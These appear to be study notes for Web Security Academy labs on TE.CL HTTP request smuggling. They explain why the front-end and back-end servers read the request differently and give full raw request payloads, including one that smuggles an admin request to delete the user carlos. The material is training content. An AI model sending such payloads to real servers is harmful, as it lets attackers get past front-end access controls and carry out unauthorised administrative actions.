Here, the front-end server uses the `Transfer-Encoding` header and the back-end server uses the `Content-Length` header. We can perform a simple HTTP request smuggling attack as follows:

`POST / HTTP/1.1 Host: vulnerable-website.com Content-Length: 3 Transfer-Encoding: chunked 8 SMUGGLED 0`

#### Note

To send this request using Burp Repeater, you will first need to go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.

You need to include the trailing sequence `\r\n\r\n` following the final `0`.

The front-end server processes the `Transfer-Encoding` header, and so treats the message body as using chunked encoding. It processes the first chunk, which is stated to be 8 bytes long, up to the start of the line following `SMUGGLED`. It processes the second chunk, which is stated to be zero length, and so is treated as terminating the request. This request is forwarded on to the back-end server.

The back-end server processes the `Content-Length` header and determines that the request body is 3 bytes long, up to the start of the line following `8`. The following bytes, starting with `SMUGGLED`, are left unprocessed, and the back-end server will treat these as being the start of the next request in the sequence
To confirm there is a vul try to run this request:

POST / HTTP/1.1
Host: 0a8700070305a1db80179fbb00ef0022.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

9f
POST /404 HTTP/1.1
Host: 0a8700070305a1db80179fbb00ef0022.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


Example:

POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5c GPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0

Another Example:

In this example we delete carlos user using 2 request, the first one is using to generar the smuggling and the second one execute it

#1 The number 50 represents de number of bytes since GET until the 6 of the content-length
POST / HTTP/1.1
Host: 0a35005304e2191a8157c07e00490092.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 2
Transfer-Encoding: chunked

50
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Length: 6

0

#2
POST / HTTP/1.1
Host: 0a35005304e2191a8157c07e00490092.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 3

0
